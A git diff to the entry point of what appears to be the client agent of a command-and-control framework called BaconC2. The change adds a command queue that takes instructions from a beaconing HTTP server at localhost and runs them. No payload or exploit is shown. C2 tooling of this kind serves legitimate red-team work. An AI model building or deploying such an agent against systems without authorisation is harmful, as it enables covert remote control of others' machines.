@@ -13,6 +13,7 @@ import (
 	"github.com/RabbITCybErSeC/BaconC2/client/core/agent"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/executor"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
+	"github.com/RabbITCybErSeC/BaconC2/client/queue"
 	"github.com/google/uuid"
 )
 
@@ -20,23 +21,29 @@ func main() {
 	cfg := config.AgentConfig{
 		AgentID:        generateAgentID(),
 		ServerURL:      "http://localhost:8081",
-		BeaconInterval: 10 * time.Second, // Beacon every 10 seconds
+		BeaconInterval: 10 * time.Second, // Default beacon interval
 		Protocol:       "http",
 	}
 
-	transportProtocol := transport.NewHTTPTransport(cfg.ServerURL, cfg.AgentID)
+	cmdQueue := queue.NewMemoryCommandQueue()
 
-	commandExecutor := executor.NewDefaultCommandExecutor()
+	transportProtocol := transport.NewHTTPTransport(cfg.ServerURL, cfg.AgentID, cmdQueue)
+
+	commandExecutor := executor.NewDefaultCommandExecutor(cmdQueue, transportProtocol, cfg.AgentID)
+
 	client := agent.NewAgentClient(cfg, transportProtocol, commandExecutor)
 	if err := client.Initialize(); err != nil {
 		log.Fatalf("Failed to initialize agent: %v", err)
 	}
+
+	go commandExecutor.ProcessCommandQueue()
 
 	if err := client.Start(); err != nil {
 		log.Fatalf("Failed to start agent: %v", err)
 	}
 	log.Println("Agent client started successfully")
 
+	// Handle termination signals
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	<-sigChan
